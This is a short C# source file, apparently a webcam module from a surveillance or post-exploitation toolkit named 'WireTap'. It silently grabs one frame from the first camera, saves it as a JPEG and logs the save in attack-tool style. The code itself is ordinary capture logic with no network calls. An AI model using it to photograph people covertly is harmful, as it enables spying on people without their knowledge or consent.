using System;
using System.Drawing;
using System.Drawing.Imaging;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Threading;

namespace WireTap
{
    class WebCam
    {
        private static string captureFile = "";
        private static VideoCaptureDevice videoSource;

        public static void CaptureImage(string outFile)
        {
            captureFile = outFile;
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new NewFrameEventHandler(video_Screenshot);
            videoSource.Start();
            Thread.Sleep(1000);
            videoSource.SignalToStop();
        }

        private static void video_Screenshot(object sender, NewFrameEventArgs eventArgs)
        {
            // get new frame
            Bitmap bitmap = eventArgs.Frame;
            bitmap.Save(captureFile, ImageFormat.Jpeg);
            Console.WriteLine("[+] Saved WebCam screenshot to: {0}", captureFile);
            captureFile = "";
            videoSource.NewFrame -= new NewFrameEventHandler(video_Screenshot);
        }


    }
}
